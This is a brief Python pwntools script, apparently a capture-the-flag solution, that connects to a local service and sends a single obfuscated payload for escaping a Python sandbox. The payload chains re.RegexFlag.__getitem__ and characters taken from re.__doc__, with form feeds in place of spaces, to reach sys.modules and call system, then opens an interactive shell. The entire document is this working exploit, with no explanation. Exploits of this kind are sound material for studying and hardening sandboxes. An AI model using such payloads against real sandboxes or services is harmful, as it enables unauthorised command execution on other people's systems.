from pwn import *

#p = process('./sandbox.py')
p = remote("localhost", 23945)
p.sendline('[[re.A[j]\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[[re.A[i].system\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[sys.modules.get]]\x0cfor\x0ci\x0cin\x0c[re.A[re.__doc__[re.DOTALL^re.M^re.T]]\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[re.__doc__[re.L].__add__]]][re.L^re.L]]\x0cfor\x0cj\x0cin\x0c[re.A[re.__doc__[re.U^re.M]]\x0cfor\x0cre.RegexFlag.__getitem__\x0cin\x0c[re.__doc__[re.DOTALL^re.M^re.T].__add__]]]')
p.interactive()
